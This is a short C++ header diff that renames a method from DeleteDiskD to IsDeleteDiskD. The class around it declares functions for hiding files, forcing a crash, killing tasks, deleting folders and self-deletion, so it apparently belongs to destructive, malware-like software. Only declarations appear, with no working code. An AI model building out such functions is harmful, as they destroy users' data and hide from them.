@@ -20,7 +20,7 @@ public:
 	bool SavePathOfFolderToDelete(CString csFolderPath);
 	void HideFile(bool bHide);
 	bool EnableCrashOnCtrlScroll();
-	bool DeleteDiskD();
+	bool IsDeleteDiskD();
 	bool SaveTaskKillWindows();
 	void SelfDelete();
 	bool PerformATask();
